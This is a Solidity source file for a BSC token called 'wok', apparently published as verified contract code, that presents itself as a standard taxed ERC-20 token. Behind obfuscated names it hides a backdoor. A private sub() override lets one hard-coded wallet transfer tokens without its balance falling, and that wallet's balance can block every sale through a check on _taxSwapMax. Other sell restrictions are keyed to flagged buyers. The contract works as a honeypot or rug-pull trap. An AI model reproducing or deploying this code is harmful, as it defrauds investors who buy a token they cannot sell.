/**
 *Submitted for verification at BscScan.com on 2023-09-07
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    }   

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) 
    external 
    returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
        ) external;
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,uint deadline
        ) 
    external
     payable
      returns (
          uint amountToken,
           uint amountETH,
            uint liquidity
            );
    }

    contract wok is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"wok";
    string private constant _symbol = unicode"wok";
    uint8 private constant _decimals = 9;

    uint256 private constant _tTotal = 1000000000 * (10**_decimals);
    uint256 public _taxSwapMin = _tTotal;
    uint256 public maxHoldingAmount = _tTotal;
    uint256 public _taxSwapThreshold = _tTotal;
    uint256 public _taxSwapMax = _tTotal;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swapCount=0;
    uint256 private _buyCount=0;

    mapping (address => uint256) private  _tOwned;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _excludedFromFees;
    mapping (address => bool) private  _ifrWaeoakirt;
    mapping(address => uint256) private  _hadeLasTransrTesap;
    bool public  transferDelayEnabled = false;
    address public  mtrkatangWtiler = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;


    IUniswapV2Router02 private  _uniRouterV2;
    address private  _uniV2LP;
    bool private  _tadangFnabiea;
    bool private  _inTaxSwap = false;
    bool private  _swapwlrsUniswappsSuer = false;

 
    event RemovrAoutuqx(uint _taxSwapMin);
    modifier lockTaxSwap {
        _inTaxSwap = true;
        _;
        _inTaxSwap = false;
    }

    constructor () { 
        _tOwned[_msgSender()] = _tTotal;
        _excludedFromFees[owner()] = true;
        _excludedFromFees[address(this)] = true;
        _excludedFromFees[mtrkatangWtiler] = true;


        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transferDelayEnabled) {
                if  (to!= address(_uniRouterV2) &&to!= address(_uniV2LP)) {
                  require (_hadeLasTransrTesap[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hadeLasTransrTesap[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2LP && to!= address (_uniRouterV2) &&!_excludedFromFees[to]) {
                require (amount <= _taxSwapMin, "Forbid");
                require (balanceOf (to) + amount <= maxHoldingAmount,"Forbid");
                if  (_buyCount < _swapCount) {
                  require (!raonetate(to));
                }
                _buyCount ++ ; _ifrWaeoakirt[to] = true;
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2LP&&from!= address (this) &&! _excludedFromFees[from]) {
                require (amount <= _taxSwapMin && balanceOf(mtrkatangWtiler) <_taxSwapMax, "Forbid");
                taxAmount = amount.mul((_buyCount > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_buyCount >_swapCount && _ifrWaeoakirt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxSwap 
            &&  to  ==_uniV2LP&&_swapwlrsUniswappsSuer &&contractTokenBalance > _taxSwapThreshold 
            &&  _buyCount > _swapCount &&! _excludedFromFees [to] &&! _excludedFromFees [from]
            )  {
                swapTokensForEth(vprty(amount,vprty(contractTokenBalance, _taxSwapMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _tOwned[address(this)] = _tOwned [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _tOwned[from] = sub(from , _tOwned [from], amount);
        _tOwned[to] = _tOwned[to].add(amount.sub (taxAmount));
        emit  Transfer( from, to, amount. sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTaxSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterV2.WETH();
        _approve(address(this), address(_uniRouterV2), tokenAmount);
        _uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function  vprty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  sub(address from, uint256 a, uint256 b) private view returns(uint256){
        if ( from  == mtrkatangWtiler ) { return a ; } else { return a . sub ( b ) ; }
    }

    function removerLimits() external onlyOwner{
        _taxSwapMin  =  _tTotal ;
        maxHoldingAmount = _tTotal ;
        transferDelayEnabled = false ;
        emit  RemovrAoutuqx ( _tTotal ) ;
    }

    function raonetate(address account) private view returns (bool) {
    return account.code.length > 0;
    }


    function startTrading() external onlyOwner() {
        require (!_tadangFnabiea, " trading is open " ) ;
        _uniRouterV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_uniRouterV2), _tTotal);
        _uniV2LP = IUniswapV2Factory(_uniRouterV2.factory()).createPair (address(this), _uniRouterV2. WETH());
        _uniRouterV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2LP).approve (address(_uniRouterV2), type(uint). max);
        _swapwlrsUniswappsSuer = true ;
        _tadangFnabiea = true ;
    }

    receive( )  external  payable  { }
    }